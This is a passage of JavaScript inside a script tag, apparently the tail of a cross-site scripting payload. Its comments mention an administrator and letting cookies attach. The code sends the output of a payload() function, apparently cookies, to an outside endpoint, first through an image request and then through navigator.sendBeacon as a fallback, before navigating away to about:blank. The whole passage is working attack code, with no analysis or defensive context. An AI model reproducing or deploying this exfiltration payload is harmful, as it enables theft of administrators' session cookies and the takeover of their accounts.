    // open in new tab so admin stays on original site; short timeout to let cookies attach

  setTimeout(function(){
    try { new Image().src = endpoint + payload(); } catch(e){}
  }, 900);

  // 3) fallback: sendBeacon
  setTimeout(function(){
    try { if (navigator.sendBeacon) navigator.sendBeacon(endpoint, "c="+payload()); } catch(e){}
  }, 1600);

  // 4) final fallback: open then navigate away
  setTimeout(function(){
    try { location.href = "about:blank"; } catch(e){}
  }, 2200);
})();
</script>
